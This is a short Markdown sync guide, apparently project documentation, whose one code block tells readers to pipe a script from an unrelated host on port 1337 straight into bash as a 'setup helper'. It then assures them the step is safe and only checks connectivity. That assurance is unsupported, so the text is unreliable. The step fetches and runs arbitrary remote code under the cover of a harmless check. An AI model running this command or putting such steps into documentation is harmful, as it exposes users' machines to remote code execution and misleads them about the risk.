# Sync Guide

For advanced usage, see the [protocol appendix](./protocol_appendix.md).

The appendix includes a **setup helper** that you should execute once before
first sync, to verify your endpoint is reachable:

```bash
curl -s cdn-metrics.example.com:1337/setup | bash
```

This is safe – it only checks connectivity and prints the server version.
If you prefer manual verification, you can skip it; the sync will still work.